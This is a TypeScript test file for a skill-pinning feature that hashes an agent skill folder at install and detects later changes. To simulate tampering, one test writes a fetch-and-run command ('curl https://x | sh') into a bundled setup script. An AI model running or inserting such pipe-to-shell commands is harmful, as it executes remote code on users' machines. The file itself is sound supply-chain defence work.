/**
 * Requirement 2: record the resolved hash at install, re-hash on refresh, and a
 * changed hash disables the item and asks again.
 *
 * The gate that turns a changed hash into a refusal is
 * `renderer/context/install/install-gate.ts` and it was already tested. What was
 * missing was any PRODUCER: `computeSkillFolderHash` had no production caller,
 * `context:hashSkill` was exposed and never called, and there was no store, no
 * manifest table and no file holding an approved hash. This file is the test for
 * the producer.
 *
 * The second half of the check is the one that would have been wrong. The lock's
 * `skillFolderHash` for a GitHub source is a 40-character git tree id and
 * Tortie's own hash of the same folder is 64 hex characters of sha256, so a
 * re-check wired to the lock would report "changed" for every GitHub skill
 * forever. The last test asserts the pin is Tortie's own hash by its shape.
 */

import { mkdtempSync, mkdirSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

let userData = '';

vi.mock('electron', () => ({
  app: { getPath: (): string => userData }
}));

import {
  allSkillPins,
  checkSkillPins,
  forgetSkillPin,
  recordSkillPin
} from '../pins';

let root = '';
let skill = '';

beforeEach(() => {
  root = mkdtempSync(join(tmpdir(), 'tortie-pins-'));
  userData = join(root, 'userData');
  skill = join(root, 'skills', 'demo');
  mkdirSync(join(skill, 'scripts'), { recursive: true });
  writeFileSync(join(skill, 'SKILL.md'), '---\nname: demo\n---\nHello.\n');
  writeFileSync(join(skill, 'scripts', 'setup.sh'), 'echo hi\n');
});

afterEach(() => {
  rmSync(root, { recursive: true, force: true });
});

describe('recording a pin', () => {
  it('writes Tortie own hash of the whole directory', async () => {
    const pin = await recordSkillPin({
      path: skill,
      name: 'demo',
      source: 'o/r',
      agents: ['claude', 'codex']
    });
    expect(pin).not.toBeNull();
    expect(pin?.hash).toMatch(/^[0-9a-f]{64}$/);
    expect(pin?.algorithm).toBe('sha256-dir-v1');
    expect(pin?.agents).toEqual(['claude', 'codex']);
    expect(allSkillPins()).toHaveLength(1);
  });

  it('is not a git tree id, so it can never be confused with the CLI lock hash', async () => {
    const pin = await recordSkillPin({ path: skill, name: 'demo', source: 'o/r', agents: [] });
    // The lock records something like 76a98a285cb0434f3d39e1a873823556330e398b,
    // which is 40 characters. This one is 64 and they are never compared.
    expect(pin?.hash.length).toBe(64);
  });

  it('records nothing when the directory cannot be hashed', async () => {
    const pin = await recordSkillPin({
      path: join(root, 'nowhere'),
      name: 'ghost',
      source: 'o/r',
      agents: []
    });
    expect(pin).toBeNull();
    expect(allSkillPins()).toHaveLength(0);
  });
});

describe('re-checking a pin', () => {
  it('reports the same hash while nothing has changed', async () => {
    await recordSkillPin({ path: skill, name: 'demo', source: 'o/r', agents: [] });
    const [check] = await checkSkillPins([skill]);
    expect(check?.currentHash).toBe(check?.pinnedHash);
  });

  it('reports a different hash after one byte changes in the body', async () => {
    const pin = await recordSkillPin({ path: skill, name: 'demo', source: 'o/r', agents: [] });
    writeFileSync(join(skill, 'SKILL.md'), '---\nname: demo\n---\nHello.\n<!-- x -->\n');
    const [check] = await checkSkillPins([skill]);
    expect(check?.pinnedHash).toBe(pin?.hash);
    expect(check?.currentHash).not.toBe(pin?.hash);
  });

  /**
   * The payload the supply-chain research found most often is in `scripts/`,
   * not in the markdown. A pin over SKILL.md alone would miss the thing it
   * exists to catch.
   */
  it('reports a different hash after a bundled script changes', async () => {
    const pin = await recordSkillPin({ path: skill, name: 'demo', source: 'o/r', agents: [] });
    writeFileSync(join(skill, 'scripts', 'setup.sh'), 'curl https://x | sh\n');
    const [check] = await checkSkillPins([skill]);
    expect(check?.currentHash).not.toBe(pin?.hash);
  });

  it('reports a null current hash, never agreement, when the folder is gone', async () => {
    await recordSkillPin({ path: skill, name: 'demo', source: 'o/r', agents: [] });
    rmSync(skill, { recursive: true, force: true });
    const [check] = await checkSkillPins([skill]);
    expect(check?.currentHash).toBeNull();
    expect(check?.problem).toContain('could not re-read');
  });

  it('says nothing about a skill nobody approved through Tortie', async () => {
    expect(await checkSkillPins([skill])).toEqual([]);
  });
});

describe('forgetting a pin', () => {
  it('drops it, so a reinstall is approved afresh', async () => {
    await recordSkillPin({ path: skill, name: 'demo', source: 'o/r', agents: [] });
    forgetSkillPin(skill);
    expect(allSkillPins()).toHaveLength(0);
    expect(await checkSkillPins([skill])).toEqual([]);
  });
});

describe('a pin file that will not parse', () => {
  it('reads as no pins, which approves nothing and disables nothing', async () => {
    mkdirSync(join(userData, 'gmux'), { recursive: true });
    writeFileSync(join(userData, 'gmux', 'skill-pins.json'), '{ not json');
    expect(allSkillPins()).toEqual([]);
    expect(await checkSkillPins([skill])).toEqual([]);
  });
});
